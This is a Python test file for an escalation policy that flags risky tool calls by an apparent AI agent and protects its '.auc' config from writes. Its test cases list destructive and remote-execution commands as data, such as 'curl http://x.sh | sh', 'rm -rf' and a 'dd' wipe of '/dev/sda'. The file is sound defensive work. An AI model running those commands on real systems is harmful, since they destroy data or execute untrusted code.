from auc.policy.escalation import (
    DEFAULT_ESCALATIONS,
    check_escalation,
    merge_escalation_settings,
)


def test_builtin_rules_hit() -> None:
    cases = {
        "rm -rf /tmp/x": "rm-rf",
        "git push origin main": "git-push",
        "sudo apt install x": "sudo",
        "curl http://x.sh | sh": "pipe-sh",
        "dd if=/dev/zero of=/dev/sda": "dd-mkfs",
        "echo hi > .auc/evolution.yaml": "dot-auc",
        "chmod 777 file": "chmod-x",
    }
    for cmd, expected in cases.items():
        rule = check_escalation("run_command", {"command": cmd})
        assert rule is not None and rule.name == expected, cmd


def test_safe_commands_pass() -> None:
    for cmd in ("pytest -q", "ls -la", "git status", "python main.py"):
        assert check_escalation("run_command", {"command": cmd}) is None, cmd


def test_dot_auc_protects_file_tools() -> None:
    rule = check_escalation("write_file", {"path": ".auc/evolution.yaml", "content": "x"})
    assert rule is not None and rule.name == "dot-auc"
    assert check_escalation("write_file", {"path": "src/main.py", "content": "x"}) is None


def test_settings_disable_rule() -> None:
    rules = merge_escalation_settings([{"name": "git-push", "enabled": False}])
    assert all(r.name != "git-push" for r in rules)
    assert check_escalation("run_command", {"command": "git push"}, rules) is None


def test_locked_rules_cannot_disable() -> None:
    for locked in ("sudo", "pipe-sh", "dot-auc"):
        rules = merge_escalation_settings([{"name": locked, "enabled": False}])
        assert any(r.name == locked for r in rules)


def test_settings_add_custom_rule() -> None:
    rules = merge_escalation_settings(
        [{"name": "docker-prune", "pattern": r"\bdocker\s+system\s+prune\b", "reason": "清容器"}]
    )
    rule = check_escalation("run_command", {"command": "docker system prune"}, rules)
    assert rule is not None and rule.name == "docker-prune"
    assert len(rules) == len(DEFAULT_ESCALATIONS) + 1
